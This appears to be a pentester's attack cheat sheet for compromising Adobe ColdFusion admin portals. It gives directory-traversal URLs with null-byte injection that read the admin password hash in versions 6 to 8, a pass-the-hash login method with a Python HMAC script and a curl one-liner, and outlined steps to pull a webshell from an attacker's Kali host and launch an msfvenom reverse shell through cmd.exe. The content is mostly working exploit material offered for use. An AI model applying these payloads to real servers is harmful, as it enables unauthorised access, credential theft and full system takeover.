
# COLD FUSION - Admin Portal LFD

## 1 - Find the Admin Panel

```
CFIDE/administrator/enter.cfm
``` 

## 2 - Use Directory Traversal to read the admin password hash

ColdFusion 6
```
http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en
```

ColdFusion 7
```
http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en	
```

ColdFusion 8
```
http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en	
```

All versions
```
http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en	
```

** TRY TO CRACK THE ADMIN PASSWORD HASH FIRST **

## 3 - Get the SALT (changes every 30 seconds)

## 4 - Combine hash and salt

## 4 - Post the login form

- admin
- hmac

# 5 - Add a scheduled task to pull a CFM webshell from KALI and write to the webroot

# 6 - Use the webshell to expand or certutil a msfvenom reverse shell 

# 7 - Exec the shell with:

command
```
c:\windows\system32\cmd.exe
```
opts
```
/c shell.exe
```

Paste hash into login form and run this in address bar
```
javascript:alert(hex_hmac_sha1(document.loginform.salt.value,document.loginform.cfadminPassword.value))
```

Here's python script that can be used with curl to get the hmac
```
#!/usr/bin/python

import sys
import hashlib
import hmac

# 
#curl -s "http://10.11.1.10/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en" | grep -w password=* | sort -u | grep -v input | cut -d"=" -f2
#

# Pipe the request above into this script to get the salt, paste in the admin password hash
# * don't forget to try and crack the hash first *


salt = sys.stdin.readline

hash='AAFDC23870ECBCD3D557B6423A8982134E17927E'
#salt=raw_input("Salt > ")

print hmac.new(salt,hash,hashlib.sha1).hexdigest().upper()
```